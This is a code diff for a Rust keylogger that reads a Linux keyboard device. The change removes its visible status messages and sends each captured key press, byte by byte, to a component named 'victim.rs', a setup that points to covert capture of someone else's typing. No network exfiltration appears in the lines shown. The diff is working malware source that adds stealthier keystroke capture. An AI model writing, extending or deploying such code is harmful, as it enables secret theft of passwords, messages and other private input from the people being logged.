@@ -6,6 +6,7 @@ use std::sync::{
 };
 use std::time::Instant;
 use std::io::{self, Write};
+use std::sync::mpsc::Sender;
 
 #[derive(Default, Debug)]
 struct Modifiers {
@@ -67,46 +68,40 @@ fn parallels_remap(key: KeyCode) -> KeyCode {
 }
 
 /// Core background loop used by victim.rs
-pub fn run_with_flag(running: Arc<AtomicBool>) -> io::Result<()> {
-    let (mut device, path) = find_keyboard()?;
-    println!("[*] Keylogger background thread started on: {}", path);
+pub fn run_with_flag(running: Arc<AtomicBool>, tx: Sender<u8>) -> io::Result<()> {
+    let (mut device, _path) = find_keyboard()?;
     
-    let start_time = Instant::now();
-    let mut modifiers = Modifiers::default();
-    let mut printed_since_syn = false;
+    // Set to non-blocking so the loop can check the 'running' flag even if no one is typing
+    device.set_nonblocking(true)?;
 
     while running.load(Ordering::SeqCst) {
-        for ev in device.fetch_events()? {
-            let rel = start_time.elapsed();
-            let rel_str = format!("+{:>3}.{:06}", rel.as_secs(), rel.subsec_micros());
-
-            match ev.destructure() {
-                EventSummary::Key(_, raw_key, value) => {
-                    let key = parallels_remap(raw_key);
-                    let value_str = match value {
-                        0 => "RELEASE",
-                        1 => "PRESS",
-                        2 => "REPEAT",
-                        _ => "UNKNOWN",
-                    };
-
-                    println!("{:<15} {:<10} {:<20} {:<10} [{}]",
-                        rel_str, "EV_KEY", format!("{:?}", key), value_str, modifiers.display()
-                    );
-                    io::stdout().flush().ok(); 
-
-                    modifiers.update(key, value);
-                    printed_since_syn = true;
+        match device.fetch_events() {
+            Ok(events) => {
+                for ev in events {
+                    // Only capture "PRESS" events (value == 1) to avoid duplicate data
+                    if let EventSummary::Key(_, raw_key, 1) = ev.destructure() {
+                        let key = parallels_remap(raw_key);
+                        
+                        // Convert KeyCode to a readable string (e.g., "KEY_ENTER" -> "ENTER ")
+                        let key_name = format!("{:?} ", key).replace("KEY_", "");
+                        
+                        // Send each byte of the key name through the channel to victim.rs
+                        for b in key_name.bytes() {
+                            if let Err(_) = tx.send(b) {
+                                return Ok(()); // Receiver hung up, stop logging
+                            }
+                        }
+                    }
                 }
-                EventSummary::Synchronization(..) if printed_since_syn => {
-                    printed_since_syn = false;
-                }
-                _ => {}
             }
-            if !running.load(Ordering::SeqCst) { break; }
+            Err(e) if e.kind() == io::ErrorKind::WouldBlock => {
+                // No events to process, sleep a tiny bit to save CPU
+                std::thread::sleep(std::time::Duration::from_millis(10));
+            }
+            Err(e) => return Err(e),
         }
     }
-    println!("[*] Keylogger stopping.");
+
     Ok(())
 }
 
@@ -114,13 +109,25 @@ pub fn run_with_flag(running: Arc<AtomicBool>) -> io::Result<()> {
 pub fn run() -> io::Result<()> {
     println!("=== Standalone Keylogger Mode ===");
     let running = Arc::new(AtomicBool::new(true));
-    let r = running.clone();
+    
+    // Create a channel so the standalone mode has somewhere to send bytes
+    let (tx, rx) = std::sync::mpsc::channel();
 
+    // Spawn a thread to print bytes received from the channel to the console
+    std::thread::spawn(move || {
+        while let Ok(b) = rx.recv() {
+            print!("{}", b as char);
+            std::io::stdout().flush().ok();
+        }
+    });
+
+    let r = running.clone();
     ctrlc::set_handler(move || {
         r.store(false, Ordering::SeqCst);
     }).expect("Error setting Ctrl+C handler");
 
-    run_with_flag(running)
+    // Pass the transmitter (tx) here
+    run_with_flag(running, tx)
 }
 
 fn main() -> io::Result<()> {
